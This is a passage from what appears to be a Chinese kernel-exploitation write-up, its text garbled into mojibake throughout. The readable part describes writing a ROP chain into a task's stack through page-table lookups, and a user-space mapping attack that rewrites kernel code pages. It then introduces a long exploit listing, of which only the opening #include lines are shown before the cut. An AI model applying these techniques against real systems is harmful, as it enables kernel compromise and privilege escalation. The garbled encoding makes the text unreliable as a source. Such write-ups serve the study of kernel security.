ˆåœ°å€ï¼Œåœ¨<code>task_struct</code>ç»“æ„ä½“ä¸­å­˜åœ¨ä¸€ä¸ªstackæˆå‘˜ï¼Œé¡¾åæ€ä¹‰å…¶ä¸­å­˜æ”¾çš„å°±æ˜¯æ ˆåœ°å€ï¼Œä¸è¿‡è¿™é‡Œå­˜æ”¾çš„æ˜¯è™šæ‹Ÿåœ°å€ã€‚ä¸è¿‡æˆ‘ä»¬å¦‚æœè¦å¾€æ ˆç©ºé—´ä¸­å†™å†…å®¹çš„è¯éœ€è¦çŸ¥é“ä»–å¯¹åº”çš„ç‰©ç†åœ°å€å¯¹åº”çš„pageç»“æ„åœ°å€ã€‚å¥½åœ¨æˆ‘ä»¬å¯ä»¥é€šè¿‡é¡µè¡¨è·å–åˆ°å¯¹åº”çš„ç‰©ç†åœ°å€ï¼Œåœ¨<code>task_struct</code>ç»“æ„ä½“ä¸­çš„<code>mm</code>æˆå‘˜ä¸­å­˜æ”¾çš„æ˜¯<code>mm_struct</code>ç»“æ„ä½“çš„åœ°å€ï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>mm_struct</code>ç»“æ„ä½“ä¸­çš„<code>pgd</code>æˆå‘˜è·å–åˆ°é¡µè¡¨çš„åœ°å€ã€‚æœ€åé€šè¿‡ä¹Ÿå˜è½¬åŒ–å³å¯è·å–åˆ°æ ˆåœ°å€å¯¹åº”çš„pageç»“æ„ä½“åœ°å€äº†ï¼Œè¿›è€Œå¾€æ ˆä¸­å†™å…¥å‡†å¤‡çš„ropå³å¯ã€‚</p><p>ç¬¬ä¸‰ç§æ–¹æ³•å°±æ˜¯é€šè¿‡<code>USMA</code>è¿›è¡Œåˆ©ç”¨ä¹Ÿå°±æ˜¯<a class="link"   href="https://vul.360.net/archives/391" >ç”¨æˆ·æ€æ˜ å°„æ”»å‡»<i class="fas fa-external-link-alt"></i></a>ï¼ŒåŸç†åˆ™æ˜¯ä¿®æ”¹å†…æ ¸ä»£ç æ®µçš„å†…å®¹ï¼Œä¸è¿‡ç›´æ¥é€šè¿‡ç›´æ¥æ˜ å°„åŒºå»ä¿®æ”¹çš„è¯ä¼šå› ä¸ºæ²¡æœ‰å†™å…¥æƒé™é€ æˆ<code>kernel panic</code>ã€‚ä½†æ˜¯ï¼Œæ”¹å†™å†…æ ¸ä»£ç æ®µçš„æœ¬è´¨æ˜¯å‘å…¶æ‰€å¯¹åº”çš„ç‰©ç†é¡µé¢å†™å…¥æ•°æ®ï¼Œæ‰€ä»¥æ—¢ç„¶æˆ‘ä»¬å¯ä»¥å¯¹é¡µè¡¨è¿›è¡Œè¯»å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åœ¨ç”¨æˆ·ç©ºé—´å»ºç«‹ä¸€ä¸ªåˆ°å†…æ ¸ä»£ç æ®µå¯¹åº”ç‰©ç†å†…å­˜çš„æ˜ å°„å°±å¯ä»¥æ”¹å†™å†…æ ¸ä»£ç äº†ã€‚</p><h3 id="ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp"><a href="#ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp"></a>ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 